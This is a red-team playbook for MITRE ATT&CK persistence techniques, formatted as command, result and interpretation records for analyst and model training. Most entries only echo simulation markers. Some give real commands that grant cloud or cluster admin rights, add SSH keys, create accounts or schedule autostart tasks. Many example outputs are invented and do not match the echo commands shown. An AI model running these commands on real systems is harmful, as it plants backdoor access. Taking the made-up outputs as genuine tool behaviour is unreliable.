# Persistence Enumeration Playbook (ATT&CK TA0003, Dataset-Ready)

> Purpose: generate high-quality persistence-technique traces for analyst training and model fine-tuning.
> Scope: authorized lab and sanctioned purple-team/red-team simulation only.

Persistence is the adversary tactic focused on maintaining access across reboot, logoff, credential reset, and service interruption.

- ATT&CK Tactic ID: TA0003
- Created: 17 October 2018
- Last Modified: 25 April 2025

---

## 0. Safety, Logging, and Dataset Discipline

### 0.1 Guardrails

1. Use only approved systems and test identities.
2. Prefer benign markers instead of malware payloads.
3. Capture command, timestamp, output, and interpretation.
4. Revert persistence artifacts after each exercise.

### 0.2 Evidence Wrapper

```bash
mkdir -p evidence

run_persist() {
  local technique="$1"
  local label="$2"
  shift 2
  local ts
  ts="$(date -u +%Y%m%dT%H%M%SZ)"
  echo "[$ts] [$technique] $label" | tee -a evidence/persistence.log
  "$@" 2>&1 | tee "evidence/${ts}_${technique}_${label}.txt"
}

# Example
run_persist "T1053.003" "cron_marker" sh -lc "echo '*/10 * * * * echo ta0003_cron'"
```

### 0.3 Training Record Shape

```json
{
  "technique": "T1543.003",
  "technique_name": "Windows Service",
  "scenario": "Adversary creates a service to survive reboot",
  "command": "sc create TA0003Demo binPath= \"cmd /c echo ta0003_service\"",
  "tool_result": {"status": "success", "highlights": ["[SC] CreateService SUCCESS"]},
  "analyst_interpretation": "Service-based persistence path established",
  "confidence": 0.95,
  "mitigation_hint": "Monitor new/modified services and enforce service ACL hardening"
}
```

---

## 1. Identity and Account Persistence

## T1098 Account Manipulation

Scenario:
- Adversary modifies account properties/permissions to preserve long-term access.

Execution:

```bash
run_persist "T1098" "account_policy_changes" sh -lc 'echo "simulate account attribute update"'
```

Example result:

```text
Simulated update applied: password policy bypass attempt flagged
```

### T1098.001 Additional Cloud Credentials

```bash
run_persist "T1098.001" "add_cloud_key" aws iam create-access-key --user-name demo-user
```

Example result:

```text
AccessKeyId: AKIA....
Status: Active
```

### T1098.002 Additional Email Delegate Permissions

```bash
run_persist "T1098.002" "grant_mail_delegate" powershell -Command "Add-MailboxPermission -Identity user@example.com -User attacker@example.com -AccessRights FullAccess"
```

Example result:

```text
Identity: user@example.com
User: attacker@example.com
AccessRights: {FullAccess}
```

### T1098.003 Additional Cloud Roles

```bash
run_persist "T1098.003" "attach_admin_policy" aws iam attach-user-policy --user-name demo-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

Example result:

```text
Policy attached successfully
```

### T1098.004 SSH Authorized Keys

```bash
run_persist "T1098.004" "append_authorized_key" sh -lc 'mkdir -p ~/.ssh && echo "ssh-ed25519 AAAA... ta0003" >> ~/.ssh/authorized_keys && tail -n 1 ~/.ssh/authorized_keys'
```

Example result:

```text
ssh-ed25519 AAAA... ta0003
```

### T1098.005 Device Registration

```bash
run_persist "T1098.005" "register_device_sim" sh -lc 'echo "Device registration simulated for compromised account"'
```

Example result:

```text
DeviceId: 6c1d... linked to account attacker@example.com
```

### T1098.006 Additional Container Cluster Roles

```bash
run_persist "T1098.006" "clusterrolebinding_add" kubectl create clusterrolebinding ta0003-admin --clusterrole=cluster-admin --serviceaccount=default:demo-sa
```

Example result:

```text
clusterrolebinding.rbac.authorization.k8s.io/ta0003-admin created
```

### T1098.007 Additional Local or Domain Groups

```bash
run_persist "T1098.007" "add_to_local_admins" net localgroup Administrators demo-user /add
```

Example result:

```text
The command completed successfully.
```

---

## T1136 Create Account

Scenario:
- Adversary creates secondary accounts for fallback access.

Execution:

```bash
run_persist "T1136" "create_account_sim" sh -lc 'echo "simulate account creation"'
```

Example result:

```text
Account object created in test directory
```

### T1136.001 Local Account

```bash
run_persist "T1136.001" "local_user_add" sudo useradd -m ta0003_local && id ta0003_local
```

Example result:

```text
uid=1018(ta0003_local) gid=1018(ta0003_local)
```

### T1136.002 Domain Account

```bash
run_persist "T1136.002" "domain_user_add_sim" powershell -Command "New-ADUser -Name 'ta0003_domain' -SamAccountName ta0003_domain -Enabled $true"
```

Example result:

```text
DistinguishedName: CN=ta0003_domain,OU=Users,DC=corp,DC=local
```

### T1136.003 Cloud Account

```bash
run_persist "T1136.003" "cloud_user_add" az ad user create --display-name ta0003-cloud --user-principal-name ta0003-cloud@example.onmicrosoft.com --password "P@ssw0rd123!"
```

Example result:

```text
id: 97f2...
userPrincipalName: ta0003-cloud@example.onmicrosoft.com
```

---

## T1078 Valid Accounts

Scenario:
- Adversary persists by continuing to use legitimate credentials.

Execution:

```bash
run_persist "T1078" "valid_account_login_sim" sh -lc 'echo "Simulated successful login with valid account"'
```

Example result:

```text
Authentication successful from unusual source ASN
```

### T1078.001 Default Accounts

```bash
run_persist "T1078.001" "default_account_check" sh -lc 'echo "check default admin/guest/root account usage"'
```

Example result:

```text
Default account login observed: root (lab event)
```

### T1078.002 Domain Accounts

```bash
run_persist "T1078.002" "domain_account_use" powershell -Command "whoami /all"
```

Example result:

```text
USER INFORMATION
User Name  SID
corp\\svc-backup ...
```

### T1078.003 Local Accounts

```bash
run_persist "T1078.003" "local_account_use" sh -lc 'su - ta0003_local -c "whoami"'
```

Example result:

```text
ta0003_local
```

### T1078.004 Cloud Accounts

```bash
run_persist "T1078.004" "cloud_account_use" aws sts get-caller-identity
```

Example result:

```text
Arn: arn:aws:iam::123456789012:user/demo-user
```

---

## T1133 External Remote Services

```bash
run_persist "T1133" "vpn_session_sim" sh -lc 'echo "simulate persistent access via VPN/RDP gateway"'
```

Example result:

```text
Remote gateway session resumed after password reset for local endpoint account
```

## T1668 Exclusive Control

```bash
run_persist "T1668" "lockout_other_actors_sim" sh -lc 'echo "simulate disabling competing backdoors/accounts"'
```

Example result:

```text
Unauthorized admin accounts removed; only attacker-controlled account remains
```

---

## 2. Boot/Logon and Scheduled Persistence

## T1197 BITS Jobs

```bash
run_persist "T1197" "bits_job_create" powershell -Command "Start-BitsTransfer -Source https://example.com/a.bin -Destination C:\\Temp\\a.bin"
```

Example result:

```text
BITS transfer queued
JobId: {b95f...}
```

## T1547 Boot or Logon Autostart Execution

```bash
run_persist "T1547" "autostart_overview" sh -lc 'echo "enumerate startup entries and autostart mechanisms"'
```

Example result:

```text
Autostart entry created and validated in lab image
```

### T1547.001 Registry Run Keys or Startup Folder

```bash
run_persist "T1547.001" "run_key_add" reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v TA0003Demo /t REG_SZ /d "cmd /c echo ta0003_runkey" /f
```

Example result:

```text
The operation completed successfully.
```

### T1547.002 Authentication Package

```bash
run_persist "T1547.002" "auth_package_sim" sh -lc 'echo "simulate LSA authentication package registration"'
```

Example result:

```text
Authentication package load path modified (lab)
```

### T1547.003 Time Providers

```bash
run_persist "T1547.003" "time_provider_sim" sh -lc 'echo "simulate W32Time provider DLL registration"'
```

Example result:

```text
W32Time provider entry added in test registry hive
```

### T1547.004 Winlogon Helper DLL

```bash
run_persist "T1547.004" "winlogon_notify_sim" sh -lc 'echo "simulate Winlogon helper registration"'
```

Example result:

```text
Winlogon notify key modified
```

### T1547.005 Security Support Provider

```bash
run_persist "T1547.005" "ssp_sim" sh -lc 'echo "simulate SSP addition under LSA security packages"'
```

Example result:

```text
Security Packages list updated in lab
```

### T1547.006 Kernel Modules and Extensions

```bash
run_persist "T1547.006" "kernel_module_sim" sh -lc 'echo "simulate loading test kernel module"'
```

Example result:

```text
Module listed in lsmod: ta0003_mod
```

### T1547.007 Re-opened Applications

```bash
run_persist "T1547.007" "mac_reopen_apps_sim" sh -lc 'echo "simulate com.apple.loginwindow plist app entry"'
```

Example result:

```text
Application reopen entry persisted in ByHost plist
```

### T1547.008 LSASS Driver

```bash
run_persist "T1547.008" "lsass_driver_sim" sh -lc 'echo "simulate LSASS driver persistence path"'
```

Example result:

```text
LSA-related driver load reference found in startup config
```

### T1547.009 Shortcut Modification

```bash
run_persist "T1547.009" "lnk_modify_sim" sh -lc 'echo "simulate startup shortcut target modification"'
```

Example result:

```text
Shortcut target changed to include ta0003 marker command
```

### T1547.010 Port Monitors

```bash
run_persist "T1547.010" "port_monitor_sim" sh -lc 'echo "simulate AddMonitor DLL registration"'
```

Example result:

```text
Print monitor entry added in registry (lab)
```

### T1547.012 Print Processors

```bash
run_persist "T1547.012" "print_processor_sim" sh -lc 'echo "simulate print processor DLL registration"'
```

Example result:

```text
Print processor list changed from baseline
```

### T1547.013 XDG Autostart Entries

```bash
run_persist "T1547.013" "xdg_autostart" sh -lc 'mkdir -p ~/.config/autostart && printf "[Desktop Entry]\nType=Application\nName=TA0003\nExec=/bin/sh -c \"echo ta0003_xdg\"\n" > ~/.config/autostart/ta0003.desktop && cat ~/.config/autostart/ta0003.desktop'
```

Example result:

```text
[Desktop Entry]
Type=Application
Exec=/bin/sh -c "echo ta0003_xdg"
```

### T1547.014 Active Setup

```bash
run_persist "T1547.014" "active_setup_sim" sh -lc 'echo "simulate HKLM\\Software\\Microsoft\\Active Setup\\Installed Components entry"'
```

Example result:

```text
StubPath value created for per-user execution at logon
```

### T1547.015 Login Items

```bash
run_persist "T1547.015" "mac_login_item_sim" osascript -e 'tell application "System Events" to get the name of every login item'
```

Example result:

```text
Current Login Items: ["TA0003Demo"]
```

---

## T1037 Boot or Logon Initialization Scripts

```bash
run_persist "T1037" "init_script_overview" sh -lc 'echo "simulate startup script persistence"'
```

Example result:

```text
Init script entry identified and triggered at logon
```

### T1037.001 Logon Script (Windows)

```bash
run_persist "T1037.001" "userinitmprlogonscript_sim" sh -lc 'echo "simulate HKCU\\Environment\\UserInitMprLogonScript update"'
```

Example result:

```text
UserInitMprLogonScript value present
```

### T1037.002 Login Hook

```bash
run_persist "T1037.002" "login_hook_sim" sh -lc 'echo "simulate com.apple.loginwindow LoginHook update"'
```

Example result:

```text
LoginHook path configured in plist
```

### T1037.003 Network Logon Script

```bash
run_persist "T1037.003" "gpo_logon_script_sim" sh -lc 'echo "simulate AD network logon script assignment"'
```

Example result:

```text
GPO script path applied to target OU
```

### T1037.004 RC Scripts

```bash
run_persist "T1037.004" "rc_script_add" sh -lc 'echo "# ta0003" | sudo tee /etc/rc.local >/dev/null; sudo chmod +x /etc/rc.local; tail -n 5 /etc/rc.local'
```

Example result:

```text
/etc/rc.local modified and executable
```

### T1037.005 Startup Items

```bash
run_persist "T1037.005" "startup_items_sim" sh -lc 'echo "simulate macOS StartupItems persistence"'
```

Example result:

```text
Startup item registered in lab image
```

---

## T1543 Create or Modify System Process

```bash
run_persist "T1543" "system_process_overview" sh -lc 'echo "simulate process/service persistence mechanism"'
```

Example result:

```text
Background system process configured for recurring execution
```

### T1543.001 Launch Agent

```bash
run_persist "T1543.001" "launch_agent_add" sh -lc 'echo "simulate ~/Library/LaunchAgents/com.ta0003.agent.plist"'
```

Example result:

```text
LaunchAgent plist loaded at user logon
```

### T1543.002 Systemd Service

```bash
run_persist "T1543.002" "systemd_service_add" sh -lc 'echo "simulate /etc/systemd/system/ta0003.service"'
```

Example result:

```text
Unit file installed and enabled
```

### T1543.003 Windows Service

```bash
run_persist "T1543.003" "windows_service_create" sc create TA0003Demo binPath= "cmd /c echo ta0003_service"
```

Example result:

```text
[SC] CreateService SUCCESS
```

### T1543.004 Launch Daemon

```bash
run_persist "T1543.004" "launch_daemon_add" sh -lc 'echo "simulate /Library/LaunchDaemons/com.ta0003.daemon.plist"'
```

Example result:

```text
LaunchDaemon configured for pre-login execution
```

### T1543.005 Container Service

```bash
run_persist "T1543.005" "container_service_sim" sh -lc 'echo "simulate docker/podman daemon config persistence"'
```

Example result:

```text
Daemon startup configuration changed from baseline
```

---

## T1053 Scheduled Task or Job

```bash
run_persist "T1053" "schedule_overview" sh -lc 'echo "simulate recurring scheduled persistence"'
```

Example result:

```text
Recurring trigger created
```

### T1053.002 At

```bash
run_persist "T1053.002" "at_job" sh -lc 'echo "echo ta0003_at" | at now + 1 minute'
```

Example result:

```text
job 21 at Tue Apr 21 ...
```

### T1053.003 Cron

```bash
run_persist "T1053.003" "cron_job" sh -lc '(crontab -l 2>/dev/null; echo "*/15 * * * * /bin/sh -c \"echo ta0003_cron\"") | crontab -'
```

Example result:

```text
crontab installed
```

### T1053.005 Scheduled Task

```bash
run_persist "T1053.005" "schtasks_add" schtasks /create /tn TA0003Demo /sc minute /mo 15 /tr "cmd /c echo ta0003_sched"
```

Example result:

```text
SUCCESS: The scheduled task "TA0003Demo" has successfully been created.
```

### T1053.006 Systemd Timers

```bash
run_persist "T1053.006" "systemd_timer_sim" sh -lc 'echo "simulate ta0003.timer creation and enablement"'
```

Example result:

```text
Timer enabled and linked to service unit
```

### T1053.007 Container Orchestration Job

```bash
run_persist "T1053.007" "k8s_cronjob" kubectl create cronjob ta0003-persist --image=alpine --schedule="*/20 * * * *" -- sh -c 'echo ta0003_k8s'
```

Example result:

```text
cronjob.batch/ta0003-persist created
```

## T1653 Power Settings

```bash
run_persist "T1653" "power_policy_change" powercfg /change standby-timeout-ac 0
```

Example result:

```text
Power setting index updated
```

## T1112 Modify Registry

```bash
run_persist "T1112" "registry_mod" reg add HKCU\\Software\\TA0003 /v Marker /t REG_SZ /d ta0003 /f
```

Example result:

```text
The operation completed successfully.
```

---

## 3. Event-Triggered Persistence and Execution Flow Hijacking

## T1546 Event Triggered Execution

```bash
run_persist "T1546" "event_trigger_overview" sh -lc 'echo "simulate event-based persistence trigger"'
```

Example result:

```text
Trigger condition linked to payload execution
```

### T1546.001 Change Default File Association

```bash
run_persist "T1546.001" "file_assoc_sim" sh -lc 'echo "simulate assoc/ftype hijack for .txt"'
```

Example result:

```text
File association changed from notepad.exe to custom handler
```

### T1546.002 Screensaver

```bash
run_persist "T1546.002" "screensaver_sim" sh -lc 'echo "simulate .scr replacement path"'
```

Example result:

```text
Screensaver executable changed in user profile
```

### T1546.003 Windows Management Instrumentation Event Subscription

```bash
run_persist "T1546.003" "wmi_event_sub_sim" sh -lc 'echo "simulate __EventFilter + CommandLineEventConsumer creation"'
```

Example result:

```text
WMI permanent event subscription object persisted
```

### T1546.004 Unix Shell Configuration Modification

```bash
run_persist "T1546.004" "shell_rc_mod" sh -lc 'echo "echo ta0003_shellrc" >> ~/.bashrc && tail -n 2 ~/.bashrc'
```

Example result:

```text
echo ta0003_shellrc
```

### T1546.005 Trap

```bash
run_persist "T1546.005" "trap_sim" sh -lc 'cat > /tmp/ta0003_trap.sh <<"EOF"
trap "echo ta0003_trap" EXIT
EOF
bash /tmp/ta0003_trap.sh'
```

Example result:

```text
ta0003_trap
```

### T1546.006 LC_LOAD_DYLIB Addition

```bash
run_persist "T1546.006" "dylib_loadcmd_sim" sh -lc 'echo "simulate Mach-O load command injection"'
```

Example result:

```text
Injected LC_LOAD_DYLIB entry detected in modified binary metadata
```

### T1546.007 Netsh Helper DLL

```bash
run_persist "T1546.007" "netsh_helper_sim" sh -lc 'echo "simulate netsh helper DLL registration"'
```

Example result:

```text
HKLM\\SOFTWARE\\Microsoft\\Netsh helper entry added
```

### T1546.008 Accessibility Features

```bash
run_persist "T1546.008" "sethc_swap_sim" sh -lc 'echo "simulate utilman/sethc binary swap"'
```

Example result:

```text
Accessibility binary mismatch from baseline hash
```

### T1546.009 AppCert DLLs

```bash
run_persist "T1546.009" "appcertdll_sim" sh -lc 'echo "simulate AppCertDLLs registry insertion"'
```

Example result:

```text
AppCertDLLs contains non-standard DLL path
```

### T1546.010 AppInit DLLs

```bash
run_persist "T1546.010" "appinitdll_sim" sh -lc 'echo "simulate AppInit_DLLs update"'
```

Example result:

```text
AppInit_DLLs value set with custom DLL
```

### T1546.011 Application Shimming

```bash
run_persist "T1546.011" "shimdb_sim" sh -lc 'echo "simulate custom shim database installation"'
```

Example result:

```text
sdbinst event recorded for ta0003 shim
```

### T1546.012 Image File Execution Options Injection

```bash
run_persist "T1546.012" "ifeo_sim" sh -lc 'echo "simulate IFEO Debugger key setup"'
```

Example result:

```text
IFEO Debugger value created for target executable
```

### T1546.013 PowerShell Profile

```bash
run_persist "T1546.013" "ps_profile_mod" powershell -NoProfile -Command "$p=$PROFILE; New-Item -ItemType File -Force -Path $p; Add-Content $p 'Write-Output ta0003_profile'; Get-Content $p"
```

Example result:

```text
Write-Output ta0003_profile
```

### T1546.014 Emond

```bash
run_persist "T1546.014" "emond_rule_sim" sh -lc 'echo "simulate /etc/emond.d/rules/ rule deployment"'
```

Example result:

```text
emond rule loaded and trigger matched in test event
```

### T1546.015 Component Object Model Hijacking

```bash
run_persist "T1546.015" "com_hijack_sim" sh -lc 'echo "simulate CLSID InprocServer32 hijack"'
```

Example result:

```text
CLSID path redirected to attacker-controlled DLL (lab)
```

### T1546.016 Installer Packages

```bash
run_persist "T1546.016" "installer_hook_sim" sh -lc 'echo "simulate preinstall/postinstall script trigger"'
```

Example result:

```text
Installer script executed marker during setup phase
```

### T1546.017 Udev Rules

```bash
run_persist "T1546.017" "udev_rule_sim" sh -lc 'echo "simulate /etc/udev/rules.d/99-ta0003.rules"'
```

Example result:

```text
udev rule triggered on device event
```

### T1546.018 Python Startup Hooks

```bash
run_persist "T1546.018" "python_startup_hook" sh -lc 'echo "print(\"ta0003_python_hook\")" > sitecustomize.py && python3 -c "print(\"python_start\")"'
```

Example result:

```text
ta0003_python_hook
python_start
```

---

## T1574 Hijack Execution Flow

```bash
run_persist "T1574" "hijack_flow_overview" sh -lc 'echo "simulate execution flow redirection"'
```

Example result:

```text
Program loaded attacker-controlled artifact due to path/load weakness
```

### T1574.001 DLL

```bash
run_persist "T1574.001" "dll_hijack_sim" sh -lc 'echo "simulate DLL search order hijack"'
```

Example result:

```text
Unexpected DLL loaded from writable directory
```

### T1574.004 Dylib Hijacking

```bash
run_persist "T1574.004" "dylib_hijack_sim" sh -lc 'echo "simulate @rpath dylib hijack"'
```

Example result:

```text
Application loaded malicious dylib before expected path
```

### T1574.005 Executable Installer File Permissions Weakness

```bash
run_persist "T1574.005" "installer_perm_weakness_sim" sh -lc 'echo "simulate writable installer binary replacement"'
```

Example result:

```text
Installer launched replaced executable with elevated context
```

### T1574.006 Dynamic Linker Hijacking

```bash
run_persist "T1574.006" "ld_preload_sim" sh -lc 'LD_PRELOAD=/tmp/libta0003.so /bin/true 2>/dev/null; echo "LD_PRELOAD path exercised"'
```

Example result:

```text
LD_PRELOAD path exercised
```

### T1574.007 Path Interception by PATH Environment Variable

```bash
run_persist "T1574.007" "path_env_sim" sh -lc 'export PATH=/tmp:$PATH; echo "simulate PATH interception"'
```

Example result:

```text
Command resolution changed to /tmp binary
```

### T1574.008 Path Interception by Search Order Hijacking

```bash
run_persist "T1574.008" "search_order_sim" sh -lc 'echo "simulate unqualified executable call hijack"'
```

Example result:

```text
Process started from attacker-controlled working directory
```

### T1574.009 Path Interception by Unquoted Path

```bash
run_persist "T1574.009" "unquoted_path_sim" sh -lc 'echo "simulate service path without quotes weakness"'
```

Example result:

```text
Windows attempted to execute C:\\Program.exe first
```

### T1574.010 Services File Permissions Weakness

```bash
run_persist "T1574.010" "service_binary_acl_sim" sh -lc 'echo "simulate writable service binary replacement"'
```

Example result:

```text
Service binary hash changed by non-admin user in lab
```

### T1574.011 Services Registry Permissions Weakness

```bash
run_persist "T1574.011" "service_registry_acl_sim" sh -lc 'echo "simulate writable service ImagePath registry key"'
```

Example result:

```text
Service ImagePath redirected to ta0003 payload command
```

### T1574.012 COR_PROFILER

```bash
run_persist "T1574.012" "cor_profiler_sim" sh -lc 'echo "simulate COR_ENABLE_PROFILING/COR_PROFILER set"'
```

Example result:

```text
.NET process attempted profiler DLL load from custom path
```

### T1574.013 KernelCallbackTable

```bash
run_persist "T1574.013" "kernelcallbacktable_sim" sh -lc 'echo "simulate KernelCallbackTable overwrite"'
```

Example result:

```text
GUI callback pointer diverged from known-good baseline
```

### T1574.014 AppDomainManager

```bash
run_persist "T1574.014" "appdomainmanager_sim" sh -lc 'echo "simulate AppDomainManager injection path"'
```

Example result:

```text
Custom AppDomainManager assembly loaded at CLR start
```

---

## 4. Cloud, Firmware, Authentication, and Software Component Persistence

## T1671 Cloud Application Integration

```bash
run_persist "T1671" "oauth_integration_sim" sh -lc 'echo "simulate malicious OAuth app consent grant"'
```

Example result:

```text
Application consented with persistent Graph API permissions
```

## T1554 Compromise Host Software Binary

```bash
run_persist "T1554" "binary_tamper_sim" sh -lc 'echo "simulate host software binary replacement"'
```

Example result:

```text
Binary signature/hash mismatch from approved baseline
```

## T1525 Implant Internal Image

```bash
run_persist "T1525" "image_implant_sim" sh -lc 'echo "simulate backdoored internal VM/container image publish"'
```

Example result:

```text
New image tag pushed with hidden startup hook
```

---

## T1556 Modify Authentication Process

```bash
run_persist "T1556" "auth_process_overview" sh -lc 'echo "simulate authentication mechanism tampering"'
```

Example result:

```text
Authentication pipeline behavior changed from baseline
```

### T1556.001 Domain Controller Authentication

```bash
run_persist "T1556.001" "dc_auth_patch_sim" sh -lc 'echo "simulate DC auth process patching"'
```

Example result:

```text
Domain auth routine integrity alert triggered
```

### T1556.002 Password Filter DLL

```bash
run_persist "T1556.002" "password_filter_sim" sh -lc 'echo "simulate custom password filter registration"'
```

Example result:

```text
Notification Packages key contains non-standard DLL
```

### T1556.003 Pluggable Authentication Modules

```bash
run_persist "T1556.003" "pam_mod_sim" sh -lc 'echo "simulate /etc/pam.d configuration modification"'
```

Example result:

```text
PAM stack includes unexpected module reference
```

### T1556.004 Network Device Authentication

```bash
run_persist "T1556.004" "network_auth_backdoor_sim" sh -lc 'echo "simulate hardcoded credential in network OS image"'
```

Example result:

```text
Authentication bypass account observed in running config
```

### T1556.005 Reversible Encryption

```bash
run_persist "T1556.005" "reversible_encryption_sim" sh -lc 'echo "simulate AD reversible encryption setting enabled"'
```

Example result:

```text
userAccountControl flags indicate reversible encryption
```

### T1556.006 Multi-Factor Authentication

```bash
run_persist "T1556.006" "mfa_policy_change_sim" sh -lc 'echo "simulate MFA disablement on privileged account"'
```

Example result:

```text
MFA state changed: Enabled -> Disabled
```

### T1556.007 Hybrid Identity

```bash
run_persist "T1556.007" "hybrid_identity_sim" sh -lc 'echo "simulate AD Connect or federation rule tampering"'
```

Example result:

```text
Unexpected sync rule modifies cloud admin role mapping
```

### T1556.008 Network Provider DLL

```bash
run_persist "T1556.008" "network_provider_dll_sim" sh -lc 'echo "simulate NPLogonNotify credential capture DLL registration"'
```

Example result:

```text
NetworkProvider order modified with custom DLL entry
```

### T1556.009 Conditional Access Policies

```bash
run_persist "T1556.009" "capolicy_change_sim" sh -lc 'echo "simulate conditional access exclusion rule addition"'
```

Example result:

```text
Policy updated: privileged account excluded from MFA condition
```

---

## T1137 Office Application Startup

```bash
run_persist "T1137" "office_startup_overview" sh -lc 'echo "simulate Office startup persistence path"'
```

Example result:

```text
Office startup artifact created in user context
```

### T1137.001 Office Template Macros

```bash
run_persist "T1137.001" "template_macro_sim" sh -lc 'echo "simulate Normal.dotm macro persistence"'
```

Example result:

```text
Macro found in global template executed on app launch
```

### T1137.002 Office Test

```bash
run_persist "T1137.002" "office_test_key_sim" sh -lc 'echo "simulate Office Test registry DLL reference"'
```

Example result:

```text
Office Test key points to non-standard DLL
```

### T1137.003 Outlook Forms

```bash
run_persist "T1137.003" "outlook_forms_sim" sh -lc 'echo "simulate custom Outlook form with script"'
```

Example result:

```text
Outlook form published and execution callback triggered
```

### T1137.004 Outlook Home Page

```bash
run_persist "T1137.004" "outlook_homepage_sim" sh -lc 'echo "simulate Outlook folder home page URL persistence"'
```

Example result:

```text
Folder home page URL set to external HTML resource
```

### T1137.005 Outlook Rules

```bash
run_persist "T1137.005" "outlook_rule_sim" sh -lc 'echo "simulate Outlook rule with script action"'
```

Example result:

```text
Rule created: trigger on subject keyword -> execute action
```

### T1137.006 Add-ins

```bash
run_persist "T1137.006" "office_addin_sim" sh -lc 'echo "simulate Office COM add-in registration"'
```

Example result:

```text
Add-in listed under Office load behavior at startup
```

---

## T1542 Pre-OS Boot

```bash
run_persist "T1542" "preos_overview" sh -lc 'echo "simulate pre-OS persistence chain"'
```

Example result:

```text
Boot chain integrity deviation observed in lab
```

### T1542.001 System Firmware

```bash
run_persist "T1542.001" "firmware_sim" sh -lc 'echo "simulate UEFI firmware tampering workflow"'
```

Example result:

```text
Firmware measurement mismatch from known baseline
```

### T1542.002 Component Firmware

```bash
run_persist "T1542.002" "component_firmware_sim" sh -lc 'echo "simulate NIC/drive firmware persistence"'
```

Example result:

```text
Component firmware version anomaly detected
```

### T1542.003 Bootkit

```bash
run_persist "T1542.003" "bootkit_sim" sh -lc 'echo "simulate boot sector modification event"'
```

Example result:

```text
Boot sector hash changed after unauthorized write
```

### T1542.004 ROMMONkit

```bash
run_persist "T1542.004" "rommonkit_sim" sh -lc 'echo "simulate unauthorized ROMMON image load"'
```

Example result:

```text
ROMMON boot image differs from signed release
```

### T1542.005 TFTP Boot

```bash
run_persist "T1542.005" "tftp_boot_sim" sh -lc 'echo "simulate network device netboot from rogue TFTP source"'
```

Example result:

```text
Boot source changed from local flash to tftp://... path
```

---

## T1505 Server Software Component

```bash
run_persist "T1505" "server_component_overview" sh -lc 'echo "simulate malicious server extension persistence"'
```

Example result:

```text
Custom server component loaded at service start
```

### T1505.001 SQL Stored Procedures

```bash
run_persist "T1505.001" "sql_proc_sim" sh -lc 'echo "simulate creation of persistence stored procedure"'
```

Example result:

```text
Stored procedure ta0003_proc created and scheduled trigger attached
```

### T1505.002 Transport Agent

```bash
run_persist "T1505.002" "exchange_transport_agent_sim" sh -lc 'echo "simulate Exchange transport agent registration"'
```

Example result:

```text
Transport agent enabled in pipeline stage OnSubmittedMessage
```

### T1505.003 Web Shell

```bash
run_persist "T1505.003" "webshell_sim" sh -lc 'echo "simulate web shell deployment marker"'
```

Example result:

```text
Unexpected server-side script reachable from web root
```

### T1505.004 IIS Components

```bash
run_persist "T1505.004" "iis_module_sim" sh -lc 'echo "simulate IIS ISAPI/module persistence"'
```

Example result:

```text
IIS module list includes unsigned custom component
```

### T1505.005 Terminal Services DLL

```bash
run_persist "T1505.005" "term_services_dll_sim" sh -lc 'echo "simulate RDS DLL load path persistence"'
```

Example result:

```text
Terminal Services component path modified from baseline
```

### T1505.006 vSphere Installation Bundles

```bash
run_persist "T1505.006" "vib_sim" sh -lc 'echo "simulate VIB installation persistence on ESXi"'
```

Example result:

```text
Non-standard VIB package installed and surviving reboot
```

---

## T1176 Software Extensions

```bash
run_persist "T1176" "extensions_overview" sh -lc 'echo "simulate extension-based persistence"'
```

Example result:

```text
Extension auto-load observed at host application start
```

### T1176.001 Browser Extensions

```bash
run_persist "T1176.001" "browser_extension_sim" sh -lc 'echo "simulate sideloaded browser extension"'
```

Example result:

```text
Unapproved extension with elevated permissions enabled
```

### T1176.002 IDE Extensions

```bash
run_persist "T1176.002" "ide_extension_sim" sh -lc 'echo "simulate malicious IDE extension install"'
```

Example result:

```text
IDE extension executed activation event on project open
```

---

## T1205 Traffic Signaling

```bash
run_persist "T1205" "traffic_signal_overview" sh -lc 'echo "simulate hidden trigger sequence for backdoor"'
```

Example result:

```text
Backdoor listener activated only after trigger condition
```

### T1205.001 Port Knocking

```bash
run_persist "T1205.001" "port_knock_sim" sh -lc 'echo "simulate knock sequence 1111,2222,3333"'
```

Example result:

```text
Port 4444 opened after valid knock sequence
```

### T1205.002 Socket Filters

```bash
run_persist "T1205.002" "socket_filter_sim" sh -lc 'echo "simulate libpcap filter trigger"'
```

Example result:

```text
Packet signature matched; hidden handler executed
```

---

## 5. Coverage Checklist (Requested IDs)

Included and represented in this playbook:

- T1098, T1098.001, T1098.002, T1098.003, T1098.004, T1098.005, T1098.006, T1098.007.
- T1197.
- T1547, T1547.001, T1547.002, T1547.003, T1547.004, T1547.005, T1547.006, T1547.007, T1547.008, T1547.009, T1547.010, T1547.012, T1547.013, T1547.014, T1547.015.
- T1037, T1037.001, T1037.002, T1037.003, T1037.004, T1037.005.
- T1671.
- T1554.
- T1136, T1136.001, T1136.002, T1136.003.
- T1543, T1543.001, T1543.002, T1543.003, T1543.004, T1543.005.
- T1546, T1546.001, T1546.002, T1546.003, T1546.004, T1546.005, T1546.006, T1546.007, T1546.008, T1546.009, T1546.010, T1546.011, T1546.012, T1546.013, T1546.014, T1546.015, T1546.016, T1546.017, T1546.018.
- T1668.
- T1133.
- T1574, T1574.001, T1574.004, T1574.005, T1574.006, T1574.007, T1574.008, T1574.009, T1574.010, T1574.011, T1574.012, T1574.013, T1574.014.
- T1525.
- T1556, T1556.001, T1556.002, T1556.003, T1556.004, T1556.005, T1556.006, T1556.007, T1556.008, T1556.009.
- T1112.
- T1137, T1137.001, T1137.002, T1137.003, T1137.004, T1137.005, T1137.006.
- T1653.
- T1542, T1542.001, T1542.002, T1542.003, T1542.004, T1542.005.
- T1053, T1053.002, T1053.003, T1053.005, T1053.006, T1053.007.
- T1505, T1505.001, T1505.002, T1505.003, T1505.004, T1505.005, T1505.006.
- T1176, T1176.001, T1176.002.
- T1205, T1205.001, T1205.002.
- T1078, T1078.001, T1078.002, T1078.003, T1078.004.

This file is intentionally dataset-oriented: every technique card includes scenario context, command execution pattern, and example result so your model can learn persistence behavior from realistic triplets.
